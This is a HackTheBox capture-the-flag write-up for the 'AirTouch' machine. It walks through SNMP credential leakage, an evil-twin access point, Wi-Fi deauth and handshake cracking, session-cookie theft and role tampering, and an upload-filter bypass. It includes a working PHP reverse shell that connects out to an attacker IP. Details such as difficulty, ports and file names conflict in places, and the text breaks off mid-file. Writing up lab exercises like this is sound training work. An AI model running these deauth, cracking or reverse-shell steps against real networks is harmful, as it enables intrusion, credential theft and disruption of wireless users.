---
title: AirTouch
os: Linux
difficulty: Medium
tags:
  - SNMP
  - WPA2-Enterprise
  - Evil Twin
  - Wireshark
  - PEAP
  - SUID
  - Privilege Escalation
date: 2026-01-18
---

# 🛡️ HTB - AirTouch (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** AirTouch
- **Operating System:** Linux
- **Difficulty:** Insane
- **Date of Scan:** 2026-01-18
- **Vulnerabilities:** SNMP Information Leak, WPA2-PSK Handshake Decrypt, HTTP Cookie Sniffing, Arbitrary File Upload Bypass, WPA2-Enterprise Rogue AP (PEAP-MSCHAPv2) Evil Twin, PEAP Credential Harvester

---

## Step 1 - Reconnaissance

Will Use Namp To Se what Port And Services are Open

```bash
nmap -A -sS -Pn -T4  --min-rate 5000 10.129.8.87
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-18 14:10 UTC
Nmap scan report for 10.129.8.87
Host is up (0.27s latency).
Not shown: 673 closed tcp ports (reset), 326 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 bd:90:00:15:cf:4b:da:cb:c9:24:05:2b:01:ac:dc:3b (RSA)
|   256 6e:e2:44:70:3c:6b:00:57:16:66:2f:37:58:be:f5:c0 (ECDSA)
|_  256 ad:d5:d5:f0:0b:af:b2:11:67:5b:07:5c:8e:85:76:76 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/18%OT=22%CT=1%CU=31752%PV=Y%DS=2%DC=T%G=Y%TM=696C
OS:E9FF%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=109%TI
OS:=Z%CI=Z%II=I%TS=A)SEQ(SP=FE%GCD=1%ISR=107%TI=Z%CI=Z%TS=A)SEQ(SP=FF%GCD=1
OS:%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NN
OS:T11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=
OS:FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=3F%W=FAF0%O=M552NNSNW7%CC=Y%
OS:Q=)T1(R=Y%DF=Y%T=3F%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=3F
OS:%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
OS:=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   286.21 ms 10.10.14.1
2   260.23 ms 10.129.8.87

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.44 seconds
```

- 🔍 *well well, there is only SSH, Lets Try enumerating some UDP Ports*

```bash
nmap -sU 10.129.8.87
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-18 14:13 UTC
Nmap scan report for 10.129.8.87
Host is up (0.39s latency).
Not shown: 997 closed udp ports (port-unreach)
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
161/udp   open          snmp
18449/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1210.47 seconds
```

- 🔍 *Okay SO we got an open UDP port 161 SNMP*

> [!NOTE]
> **what is SNMP:**
> SNMP (Simple Network Management Protocol) is an application-layer protocol used for monitoring and managing network devices on an IP network. It provides a standardized framework that allows administrators to collect performance data, detect faults, and configure remote equipment regardless of the manufacturer.
> 
> In simple terms it helps the admins to manage the device such as router/switches/servers etc on an ip.

---

## Step 2 - Initial Foothold

- 🔍 *Since we know that SNMP is open, lets try enumerating SNMP version and Community Strings (which may contain, leaked creds)*

```bash
snmp-check 10.129.8.87
```

```text
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.129.8.87:161 using SNMPv1 and community 'public'

[*] System information:
Host IP address               : 10.129.8.87
Hostname                      : Consultant
Description                   : "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
Contact                       : admin@AirTouch.htb
Location                      : "Consultant pc"
Uptime snmp                   : 16:26:20.73
Uptime system                 : 16:25:10.60
System date
```

- 🔍 *As Expected, it contains Creds for user "consultant"*

- 🔍 *Lets connect with SSH -*

```bash
ssh consultant@10.129.8.87
```

```text
consultant@10.129.8.87's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

consultant@AirTouch-Consultant:~$ ls
diagram-net.png  photo_2023-03-01_22-04-52.png
consultant@AirTouch-Consultant:~$ cd /
consultant@AirTouch-Consultant:/$
```

- 🔍 *Well, its a container, by the way, it is one of the three VLAN's machines*

1. **Consultant's VLAN**
2. **AirTouch Internet**
3. **Airtouch VLAN**

- 🔍 *with the current user we only have route to the Gateway: 172.20.1.1 at MAC 46:cd:76:37:c7:85*
- 🔍 *we can't reach other hosts, via this host*

---

## Step 3 - Lateral Movement to AirTouch-Internet

- 🔍 *Lets try to look what Priv Consultant has*

```bash
consultant@AirTouch-Consultant:~$ sudo -l
```

```text
Matching Defaults entries for consultant on AirTouch-Consultant:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User consultant may run the following commands on AirTouch-Consultant:
    (ALL) NOPASSWD: ALL
```

- 🔍 *So consultant is the root.*

- 🔍 *Lets do sudo -i*

```bash
consultant@AirTouch-Consultant:~$ sudo -i
```

```text
root@AirTouch-Consultant:~#
```

- 🔍 *now while enumerating we got a tool*

```bash
root@AirTouch-Consultant:~# ls
eaphammer
root@AirTouch-Consultant:~# ls -la eaphammer
```

```text
total 320
drwxr-xr-x 1 root root  4096 Jan 19 14:49 .
drwx------ 1 root root  4096 Jan 19 13:34 ..
drwxr-xr-x 8 root root  4096 Mar 27  2024 .git
drwxr-xr-x 3 root root  4096 Mar 27  2024 .github
-rw-r--r-- 1 root root  1045 Mar 27  2024 .gitignore
-rw-r--r-- 1 root root  9019 Mar 27  2024 Changelog
-rw-r--r-- 1 root root  1782 Mar 27  2024 ESSIDStripping.md
-rw-r--r-- 1 root root 35141 Mar 27  2024 LICENSE
-rw-r--r-- 1 root root  8207 Mar 27  2024 README.md
-rw-r--r-- 1 root root   114 Mar 27  2024 SECURITY.md
drwxr-xr-x 2 root root  4096 Jan 19 14:20 __pycache__
-rw-r--r-- 1 root root   205 Mar 27  2024 __version__.py
drwxr-xr-x 2 root root  4096 Mar 27  2024 base
-rw-r--r-- 1 root root   178 Jan 19 14:50 besside.log
drwxr-xr-x 1 root root  4096 Jan 19 14:20 cert_wizard
drwxr-xr-x 1 root root  4096 Mar 27  2024 certs
drwxr-xr-x 1 root root  4096 Jan 19 14:20 core
drwxr-xr-x 2 root root  4096 Mar 27  2024 db
drwxr-xr-x 3 root root  4096 Mar 27  2024 docs
-rwxr-xr-x 1 root root 37449 Mar 27  2024 eaphammer
-rwxr-xr-x 1 root root 21131 Mar 27  2024 ehdb
-rw-r--r-- 1 root root     0 Jan 19 14:20 events.log
-rwxr-xr-x 1 root root  6388 Mar 27  2024 forge-beacons
-rw-r--r-- 1 root root   129 Mar 27  2024 kali-dependencies.txt
-rwxr-xr-x 1 root root  4532 Mar 27  2024 kali-setup
-rw-r--r-- 1 root root     0 Jan 19 14:20 keystroke.log
drwxr-xr-x 7 root root  4096 Jan 13 14:55 local
drwxr-xr-x 2 root root  4096 Mar 27  2024 logs
drwxr-xr-x 2 root root  4096 Mar 27  2024 loot
-rw-r--r-- 1 root root   129 Mar 27  2024 parrot-dependencies.txt
-rwxr-xr-x 1 root root  4536 Mar 27  2024 parrot-setup
-rwxr-xr-x 1 root root  1163 Mar 27  2024 payload_generator
drwxr-xr-x 2 root root  4096 Mar 27  2024 payloads
-rw-r--r-- 1 root root   132 Mar 27  2024 pip.req
-rw-r--r-- 1 root root   129 Mar 27  2024 raspbian-dependencies.txt
-rwxr-xr-x 1 root root  4962 Mar 27  2024 raspbian-setup
drwxr-xr-x 1 root root  4096 Jan 19 14:42 run
drwxr-xr-x 2 root root  4096 Mar 27  2024 saved-configs
drwxr-xr-x 2 root root  4096 Mar 27  2024 scripts
drwxr-xr-x 4 root root  4096 Mar 27  2024 settings
lrwxrwxrwx 1 root root    56 Mar 27  2024 templates -> /root/eaphammer/core/wskeyloggerd/templates/user_defined
drwxr-xr-x 2 root root  4096 Mar 27  2024 testing
drwxr-xr-x 1 root root  4096 Jan 19 14:42 tmp
-rwxr-xr-x 1 root root  4340 Mar 27  2024 ubuntu-unattended-setup
-rw-r--r-- 1 root root     0 Jan 19 14:20 user.log
-rw-r--r-- 1 root root    24 Jan 19 14:49 wep.cap
drwxr-xr-x 2 root root  4096 Mar 27  2024 wordlists
-rw-r--r-- 1 root root   479 Jan 19 14:50 wpa.cap
-rw-r--r-- 1 root root     0 Jan 19 14:20 wskeylogger.log
```

- 🔍 *What is EAPHammer:*

> [!NOTE]
> **EAPHammer Overview:**
> EAPHammer is a specialized open-source toolkit used to perform evil-twin attacks on WPA2-Enterprise wireless networks.

> [!IMPORTANT]
> **Attack Plan:**
> 1. Create a Fake AP
> 2. Deauth attack on Airtouch-wifi
> 3. Capture the handshake
> 4. Decode the handshake
> 5. Get the key
> 6. Connect, discover the assigned IP and web service
> 7. Access the web panel

---

### Execution

#### 1. Creating Fake Access Point

```bash
./eaphammer -i wlan0 --essid "AirTouch-Office" --channel 6 --auth wpa-eap --creds
```

```text
                     .__
  ____ _____  ______ |  |__ _____    _____   _____   ___________
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|
     \/     \/|__|        \/     \/      \/      \/     \/


                       Now with more fast travel than a next-gen Bethesda game. >:D

                            Version:  1.14.0
                           Codename:  Final Frontier
                             Author:  @s0lst1c3
                            Contact:  gabriel<<at>>transmitengage.com

 
[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
[*] Saving current iptables configuration...
[*] Reticulating radio frequency splines...
Error: Could not create NMClient object: Could not connect: No such file or directory.

[*] Using nmcli to tell NetworkManager not to manage wlan0...

100%|██████████████████████| 1/1 [00:01<00:00,  1.00s/it]

[*] Success: wlan0 no longer controlled by NetworkManager.
[*] WPA handshakes will be saved to /root/eaphammer/loot/wpa_handshake_capture-2026-01-19-14-41-59-SlIFxSEcyTXyyqIHt2FRyorRzptrJ1Xv.hccapx

[hostapd] AP starting...

Configuration file: /root/eaphammer/tmp/hostapd-2026-01-19-14-41-59-W4S6SelEqCBFmgl7FNhGxKXpAN1JfIqS.conf
rfkill: Cannot open RFKILL control device
wlan0: interface state UNINITIALIZED->COUNTRY_UPDATE
Using interface wlan0 with hwaddr 00:11:22:33:44:00 and ssid "AirTouch-Office"
wlan0: interface state COUNTRY_UPDATE->ENABLED
wlan0: AP-ENABLED


Press enter to quit...


[hostapd] Terminating event loop...
[hostapd] Event loop terminated.
[hostapd] Hostapd worker still running... waiting for it to join.

wlan0: interface state ENABLED->DISABLED
wlan0: AP-DISABLED
wlan0: CTRL-EVENT-TERMINATING
nl80211: deinit ifname=wlan0 disabled_11b_rates=0

[hostapd] Worker joined.
[hostapd] AP disabled.

Error: Could not create NMClient object: Could not connect: No such file or directory.

[*] Using nmcli to give NetworkManager control of wlan0...

100%|██████████████████████| 1/1 [00:01<00:00,  1.00s/it]

[*] Success: wlan0 is now managed by NetworkManager
```

#### 2. Performing The DEAUTH Attack

```bash
besside-ng wlan0mon
```

```text
[14:49:31] Let's ride
[14:49:31] Logging to besside.log
[14:49:39] TO-OWN [MOVISTAR_FG68*, WIFI-JOHN*, AirTouch-Internet*, MiFibra-24-D4VY*, vodafoneFB6N*] OWNED []
[14:50:00] / Attacking [AirTouch-Internet] WPA - DEAUTH ([14:50:00] - Attacking [AirTouch-Internet] WPA - DEAUTH ([14:50:00] \ Attacking [AirTouch-Internet] WPA - DEAUTH ([14:50:00] \ Attacking [AirTouch-Internet] WPA - DEAUTH ([14:50:00] | Attacking [AirTouch-Internet] WPA - DEAUTH ([14:50:00] / Attacking [AirTouch-Internet] WPA - DEAUTH ([14:50:00] - Attacking [AirTouch-Internet] WPA - DEAUTH ([14:50:00] | Attacking [AirTouch-Internet] WPA - DEAUTH ([14:50:00] / Attacking [AirTouch-Internet] WPA - DEAUTH ([14:50:00] - Attacking [AirTouch-Internet] WPA - DEAUTH ([14:50:00] \ Attacking [AirTouch-Internet] WPA - DEAUTH ([14:50:00] | Attacking [AirTouch-Internet] WPA - DEAUTH ([14:50:00] / Attacking [AirTouch-Internet] WPA - DEAUTH ([14:50:00] Got necessary WPA handshake info for AirTouch-Internet
[14:50:00] Run aircrack on wpa.cap for WPA key
[14:50:00] Pwned network AirTouch-Internet in 0:01 mins:sec
[14:50:00] TO-OWN [MOVISTAR_FG68*, WIFI-JOHN*, MiFibra-24-D4VY*, vodafoneFB6N*] OWNED [AirTouch-Internet*]
^C4:50:53] / Attacking [vodafoneFB6N] WPA - DEAUTH
Dying...
[14:50:53] TO-OWN [MOVISTAR_FG68*, WIFI-JOHN*, MiFibra-24-D4VY*, vodafoneFB6N*] OWNED [AirTouch-Internet*]
```

#### 3. Capturing the Handshake Files

```bash
ls -la *.cap
```

```text
-rw-r--r-- 1 root root  24 Jan 19 14:49 wep.cap
-rw-r--r-- 1 root root 479 Jan 19 14:50 wpa.cap
```

#### 4. Decoding/Bruteforcing the Handshake

```bash
aircrack-ng wpa.cap -w wordlists/rockyou.txt
```

```text
Reading packets, please wait...
Opening wpa.cap
Read 3 packets.

  #  BSSID              ESSID                     Encryption

  1  F0:9F:C2:A3:F1:A7  AirTouch-Internet         WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening wpa.cap
Read 3 packets.

1 potential targets

                              Aircrack-ng 1.6

     [00:00:09] 21840/14344391 keys tested (2362.42 k/s)
     Time left: 1 hour, 41 minutes, 3 seconds                   0.15%

                          KEY FOUND! [ challenge ]

     Master Key     : D1 FF 70 2D CB 11 82 EE C9 E1 89 E1 69 35 55 A0
                      07 DC 1B 21 BE 35 8E 02 B8 75 74 49 7D CF 01 7E
     Transient Key  : D7 A6 FB 2C 89 B6 9C 30 4A 00 BC 0F 62 AC B0 D3
                      3E F2 65 E6 75 11 82 C9 4A E3 BC 38 7D 45 1D 51
                      A0 0A 01 98 16 5F 8B AA 37 06 DF 7A 79 9EAPOL HMAC     : 8E A7 8D BE A4 2C EC B9 5A 6F 00 3E 38 99 5F 1B          BE 47 FD 31 DD F5 03 14 80 88 53 03 CE DC 5B DA
```

- 🔍 *Got the key---> challenge*

#### 5. Connecting and Getting the IP

```bash
ip link set wlan1 up
cat > /tmp/wpa.conf << EOF
network={
ssid="AirTouch-Internet"
psk="challenge"
}
EOF
wpa_supplicant -i wlan1 -c /tmp/wpa.conf -B -D nl80211,wext
```

```text
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
```

```bash
dhclient wlan1
```

#### 6. Get the Assigned IP

```bash
ifconfig wlan1
```

```text
wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
       inet 192.168.3.23  netmask 255.255.255.0  broadcast 192.168.3.255
       inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
       ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
       RX packets 17  bytes 2737 (2.7 KB)
       RX errors 0  dropped 0  overruns 0  frame 0
       TX packets 37  bytes 4825 (4.8 KB)
       TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

- 🔍 *Lets find where actually is the web service*

```bash
for ip in 192.168.3.{1..50}; do
    if [ "$ip" != "192.168.3.23" ]; then
        timeout 0.3 curl -s http://$ip >/dev/null 2>&1 && echo "Web server found at: $ip"
    fi
done
```

```text
Web server found at: 192.168.3.1
```

- 🔍 *web service is at---> 192.168.3.1*

#### 7. Access the Web Panel on Attacker machine

```bash
sshuttle -r consultant@10.129.8.200 192.168.3.0/24
```

> [!NOTE]
> sshuttle is being used to tunnel the entire network.

- 🔍 *go on browser and search `http://192.168.3.1/login.php`*

---

## Step 4 - Acquiring User Flag

- 🔍 *By looking at the Page, we can say that its a PSK ROUTER login and Configuration page.*
- 🔍 *The Commonly Found Credentials won't work on it (The one that we've found for User Consultant)*
- 🔍 *We Need to Capture the traffic, like we did in the handshake capture.*
- 🔍 *Because The one client who connects to the WIFI AirTouch-Internet, is also the one who connects the lab.php for the further exploitation*
- 🔍 *So we need to again deauth the client and capture the same .cap file, that we did in the key decryption.*
- 🔍 *Then We need to add the Key that we found after the Decryption of handshake at the Protocols of the wireshark, to see HTTP traffic.*
- 🔍 *Then we can acquire the PHPSESSIONID for the manager user*
- 🔍 *And then We can Change the UserRole to Admin, and can use the upload file utility to get the reverse shell*
- 🔍 *And in that shell we can get the User Flag.*

- 🔍 *Lets Capture the Traffic First:-*

```bash
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
iwconfig wlan0
```

```text
wlan0     IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

- 🔍 *we confirm the monitor mode for wlan0 interface*

```bash
airodump-ng --bssid F0:9F:C2:A3:F1:A7 -c 6 -w /tmp/inet wlan0
```

```text
 CH  6 ][ Elapsed: 1 min ][ 2026-01-18 09:52
 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 F0:9F:C2:A3:F1:A7  -28 100      755       31    0   6   54        CCMP   PSK  AirTouch-Inter
 
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 F0:9F:C2:A3:F1:A7  28:6C:07:FE:A3:22  -29    1 -18      0       33         AirTouch-Interne
```

```bash
aireplay-ng -0 10 -a F0:9F:C2:A3:F1:A7 wlan0
```

```text
14:06:45  Waiting for beacon frame (BSSID: F0:9F:C2:A3:F1:A7) on channel 6
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
14:06:45  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:06:46  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:06:46  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:06:47  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:06:47  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:06:48  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:06:48  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:06:48  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:06:49  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:06:49  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
```

```bash
aireplay-ng -0 10 -a F0:9F:C2:A3:F1:A7 wlan0
```

```text
14:11:19  Waiting for beacon frame (BSSID: F0:9F:C2:A3:F1:A7) on channel 6
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
14:11:19  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:11:19  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:11:20  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:11:20  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:11:21  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:11:21  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:11:22  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:11:22  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:11:23  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
14:11:23  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]
```

```bash
ls -la /tmp
```

- 🔍 *look for the inet-01.cap file*
- 🔍 *Send it to your attacker machine*
- 🔍 *Open it in Wireshark*

> [!NOTE]
> Set Decryption key, because packets are encrypted:
> Go to Edit -> Preferences -> Protocols -> IEEE 802.11 -> Decryption keys (click on edit)
> Select key type -> wpa-pwd, and In the value section -> challenge:AirTouch-Internet

- 🔍 *in wireshark filters use http filter*
- 🔍 *Select which has a packet of **lab.php***
- 🔍 *In lab.php you can see a PHPSESSIONID*

```text
Frame 2631: 243 bytes on wire (1944 bits), 243 bytes captured (1944 bits)
IEEE 802.11 Data, Flags: .p.....T
Logical-Link Control
Internet Protocol Version 4, Src: 192.168.3.74, Dst: 192.168.3.1
Transmission Control Protocol, Src Port: 44860, Dst Port: 80, Seq: 1, Ack: 1, Len: 143
Hypertext Transfer Protocol
    GET /lab.php HTTP/1.1\r\n
    Host: 192.168.3.1\r\n
    User-Agent: curl/7.88.1\r\n
    Accept: */*\r\n
    Cookie: PHPSESSID=plea9q2c89e321pcm7tb7uttpf; UserRole=user\r\n
    \r\n
    [Full request URI: http://192.168.3.1/lab.php]
    [HTTP request 1/1]
    [Response in frame: 2633]
```

- 🔍 *Paste it in the browser and you'll get the manager configuration page*
- 🔍 *Go to cookie editor you'll see a '+' to add new attribute, add one for UserRole and in value put admin*
- 🔍 *you should be admin now, and look for the upload utility*

```http
POST /index.php HTTP/1.1
Host: 192.168.3.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------20805770272787483531571508081
Content-Length: 5691
Origin: http://192.168.3.1
Connection: close
Referer: http://192.168.3.1/index.php
Cookie: PHPSESSID=plea9q2c89e321pcm7tb7uttpf; UserRole=admin
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------20805770272787483531571508081
Content-Disposition: form-data; name="fileToUpload"; filename="1042.zip"
Content-Type: application/zip
```

- 🔍 *this is the intercepted request to see where does this file goes*
- 🔍 *the file is being stored at /upload*
- 🔍 *Unfortunately it filters .php and any other direct payloads or files*
- 🔍 *However we can use .phtml (Same as PHP, can be use to bypass the Filter)*
- 🔍 *Create a reverseShell payload For the AirtouchInternet router at 192.168.3.46*

```php
<?php
// rev.phtml - PHP Reverse Shell
$ip = "192.168.3.46";  // Your Tablets VLAN client IP
$port = 4444;           // Listening port

echo "Attempting reverse shell to $ip:$port<br>";

// Method 1: exec()
$sock = fsockopen($ip, $port);
if ($sock) {
   fwrite($sock, "Connected via PHP reverse shell\n");
   while ($cmd = fgets($sock)) {
       $output = shell_exec(trim($cmd));
       fwrite($sock, $output);
   }
   fclose($sock);
} else {
   echo "Failed to connect to $ip:$port";
}
```

- 🔍 *set up a listener at 4444*
- 🔍 *Upload the reverse shell file*
- 🔍 *hit `http://192.168.3.1/upload/revshell.phtml` to Trigger the payload*
- 🔍 *On listener you have got a reverse shell*

```bash
./busybox nc -lnvp 443
```

```text
listening on [::]:443 ...
connect to [::ffff:192.168.3.46]:443 from [::ffff:192.168.3.1]:57038 ([::ffff:192.168.3.1]:570
SOCKET: Shell has connected! PID: 79709
```

```bash
id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- 🔍 *it is an unstable container, stabilize it with--> `script -c bash 2>/dev/null`*
- 🔍 *you are now on the web shell*

```bash
www-data@AirTouch-AP-PSK:/var/www/html/uploads$ pwd
```

```text
/var/www/html/uploads
```

- 🔍 *While Enumerating the web directory i have found a login.php page*

```php
if (isset($_POST['Submit'])) {
  /* Define username, associated password, and user attribute array */
  $logins = array(
    /*'user' => array('password' => 'JunDRDZKHDnpkpDDvay', 'role' => 'admin'),*/
    'manager' => array('password' => '2wLFYNh4TSTgA5sNgT4', 'role' => 'user')
  );
```

- 🔍 *it contains two creds*

1. **User --> JunDRDZKHDnpkpDDvay**
2. **manager --> 2wLFYNh4TSTgA5sNgT4**

- 🔍 *you can use them in web also*
- 🔍 *get SSH for user*

```bash
ssh user@192.168.3.1
```

> [!NOTE]
> password = JunDRDZKHDnpkpDDvay

```bash
user@AirTouch-AP-PSK:~$ id
```

```text
uid=1000(user) gid=1000(user) groups=1000(user)
```

- 🔍 *Check permissions*

```bash
user@AirTouch-AP-PSK:~$ sudo -l
```

```text
Matching Defaults entries for user on AirTouch-AP-PSK:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on AirTouch-AP-PSK:
    (ALL) NOPASSWD: ALL
```

- 🔍 *Get the User Flag.*

```bash
root@AirTouch-AP-PSK:/home/user# cd
root@AirTouch-AP-PSK:~# ls -la
```

```text
total 44
drwx------ 1 root root 4096 Jan 18 00:07 .
drwxr-xr-x 1 root root 4096 Jan 18 00:07 ..
lrwxrwxrwx 1 root root    9 Nov 24  2024 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
drwxr-xr-x 2 root root 4096 Mar 27  2024 certs-backup
-rwxr-xr-x 1 root root    0 Mar 27  2024 cronAPs.sh
drwxr-xr-x 1 root root 4096 Jan 18 00:08 psk
-rw-r--r-- 1 root root  364 Nov 24  2024 send_certs.sh
-rwxr-xr-x 1 root root 1963 Mar 27  2024 start.sh
-rw-r----- 1 root 1001   33 Jan 18 00:07 user.txt
-rw-r--r-- 1 root root  319 Mar 27  2024 wlan_config_aps
```

---

## Step 5 - Root Access

- 🔍 *The Shell that we have Just pawned, has some core AP Configuration Files*

```bash
root@AirTouch-AP-PSK:~# ls psk
```

```text
hostapd_other0.conf  hostapd_other2.conf  hostapd_wpa.conf
hostapd_other1.conf  hostapd_other3.conf
```

```bash
root@AirTouch-AP-PSK:~# ls certs-backup/
```

```text
ca.conf  ca.crt  server.conf  server.crt  server.csr  server.ext  server.key
```

- 🔍 *While Enumerating We have found:-*
  - `certs-backup/` (CA + server cert + private key)
  - `psk/hostapd_*.conf` (WiFi configs for all SSIDs/VLANs)
  - `wlan_config_aps` (WLAN ↔ subnet mapping)

- 🔍 *The WLAN Mapping inside wlan_config_aps shows how each WLAN Interface Maps to VLAN style subnet*
  - wlan7 → 192.168.3.0/24 (PSK VLAN)
  - wlan8 → 192.168.4.0/24
  - wlan9 → 192.168.5.0/24
  - wlan10 → 192.168.6.0/24
  - wlan11 → 192.168.7.0/24

- 🔍 *The 'hostapd_wpa.conf' Is the Configuration File for Airtouch-Internet.*
  - WPA2-PSK on wlan7
  - channel 6
  - password = challenge
  - ap_isolate=1 (clients can't talk to each other)

- 🔍 *While Looking At Other hostapd_other*.conf file, we can see that those are just Neighbour WIFI PSKs each with a Hardcoded passphrase.*

```bash
for f in psk/hostapd_other*.conf; do
  echo "===================="
  echo "$f"
  echo "===================="
  cat "$f"
  echo
done
```

```text
====================
psk/hostapd_other0.conf
====================
interface=wlan8
driver=nl80211
hw_mode=g
channel=3
ssid=MOVISTAR_FG68
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase="bvZmh2dQ5ZC5Fe79YLzViAijK"

====================
psk/hostapd_other1.conf
====================
interface=wlan9
driver=nl80211
hw_mode=g
channel=6
ssid=WIFI-JOHN
wpa=2
wpa_key_mgmt=WPA-PSK
